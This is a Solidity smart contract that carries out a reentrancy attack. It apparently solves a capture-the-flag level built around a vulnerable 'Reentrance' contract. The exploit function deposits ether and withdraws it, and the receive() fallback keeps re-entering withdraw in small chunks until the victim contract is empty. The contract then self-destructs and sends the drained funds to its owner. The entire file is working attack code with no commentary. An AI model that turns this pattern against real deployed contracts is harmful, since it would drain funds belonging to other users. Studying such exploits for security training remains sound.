// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

import 'open-zeppelin/utils/math/SafeMath.sol';
import "open-zeppelin/access/Ownable.sol";
import './Reentrance.sol';

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
    receive() external payable;
}

contract ReentrancyExploit is Ownable {
    IReentrance instance;

    constructor(address victimContract) Ownable() {
        instance = IReentrance(payable(victimContract));
    }

    function exploit() public payable onlyOwner {
        instance.donate{value: msg.value}(address(this));
        instance.withdraw(msg.value);

        require(address(instance).balance == 0, "FAIL");

        selfdestruct(payable(msg.sender));
    }


    receive() external payable {
        uint256 balance = instance.balanceOf(address(this));
        uint256 withdrawableAmount = balance < 0.001 ether 
            ? balance
            :0.001 ether;

        if (withdrawableAmount > 0) {
            instance.withdraw(withdrawableAmount);
        }

    }
}